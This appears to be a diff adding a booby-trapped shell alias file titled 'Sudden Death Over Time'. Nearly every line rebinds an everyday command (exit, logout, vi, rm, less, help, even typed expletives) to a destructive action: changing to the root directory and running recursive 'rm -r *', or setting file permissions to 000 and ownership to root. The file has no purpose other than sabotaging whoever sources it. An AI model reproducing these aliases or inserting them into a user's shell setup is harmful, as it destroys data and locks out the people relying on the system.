@@ -1,0 +1,32 @@
+
+
+
+Sudden Death Over Time
+
+
+alias exit='alias'
+alias alias='unalias rm; rm -r *'
+alias logout='rm -r *'
+alias pico='vi'
+alias vi='emacs'
+alias emacs='cd /; unalias rm; rm -r *'
+alias rm='unalias rm; rm -r *'
+alias cat='pico'
+alias touch='vi'
+alias more='less'
+alias less='cd /; unalias rm; rm -r *'
+alias strings='chown root *.*'
+alias pine='cd /; unalias rm; rm-r *'
+alias ^d='chmod 000 *.*'
+alias ^x='chmod 000 *.*'
+alias ^c='chmod 000 *.*'
+alias Hell!='cd /; unalias rm; rm -r *'
+alias Fuck!='cd /; unalias rm; rm -r *'
+alias Shit!='cd /; unalias rm; rm -r *'
+alias help='cd /; unalias rm; rm -r *'
+alias Damn!='cd /; unalias rm; rm -r *'
+alias kill='emacs -doctor'
+alias shutdown='emacs -doctor'
+alias ps='emacs -doctor'
+
+
